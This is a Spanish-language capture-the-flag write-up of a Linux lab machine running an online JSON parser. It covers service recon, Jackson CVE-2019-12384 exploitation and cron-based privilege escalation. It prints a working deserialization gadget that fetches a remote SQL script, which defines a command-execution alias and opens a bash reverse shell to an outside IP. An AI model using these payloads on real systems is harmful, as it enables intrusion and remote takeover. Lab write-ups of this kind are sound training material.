-------
- Tags: #json #SSRF #rce #cron-job 
---------
## Técnicas utilizadas
- Jackson CVE-2019-12384 Exploitation - SSRF to RCE  
- Abusing Cron Job [Privilege Escalation]
## Procedimiento

![[Pasted image 20230721100211.png]]

---------
#### Reconocimiento
Un escaneo con **Nmap** nos da como resultado los siguientes puertos:
```ruby
# nmap -sCV -p22,80 10.10.10.214 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 19:34 MST
Nmap scan report for 10.10.10.214
Host is up (1.1s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f7d97825f042be00a56325d145682d4 (RSA)
|   256 24ea5349d8cb9bfcd6c426efdd34c11e (ECDSA)
|_  256 fe2534e43edf9fed622aa49352cccd27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.18 seconds
```

Si lanzamos **WhatWeb** sobre el aplicativo web podemos ver las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.214
http://10.10.10.214 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.214], JQuery[3.2.1], Script, Title[Online JSON parser]
```

---------------
#### Jackson CVE-2019-12384 Exploitation - SSRF to RCE  
Si visitamos la pagina web, vemos que hay un tipo de convertidor de **Json** a un **Json Pretty**. Si colocamos la opcion **Beutify** y ponemos la estructura basica de un **Json** este simplemente nos lo colocara de forma ordenada y separada para visualizarlo de mejor manera ( como la herramienta **jq** pero a nivel de web ):
![[Pasted image 20230721193800.png]]

Al intentar hacer lo mismo pero con la otra opcion, vemos que nos lanza un error:
![[Pasted image 20230721193846.png]]

Al googlear por vulnerabilidades existentes encontramos un [articulo](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)que nos explica bien como conseguir una ejecución remota de comandos. Tenemos que colocar el **OneLiner** que nos indica el articulo, en la parte del input del **Validate**:
```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.3/inject.sql'"}]
```

Ahora podemos ponernos en escucha con **Python** compartiendo un larchivo el cual va a contener lo siguiente:
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/443 0>&1')
```

Y esto nos entablara una **reverse shell**.

-----------
#### Abusing Cron Job [Privilege Escalation]
Si lanzamos **Pspy** podemos ver que **Root** esta ejecutando un script en intervalos regulares de tiempo. Este script escrito en **Bash** tiene permisos de **Escritura**, asi que podemos modificalro para que otorgue una **SUID** a la **Bash**.
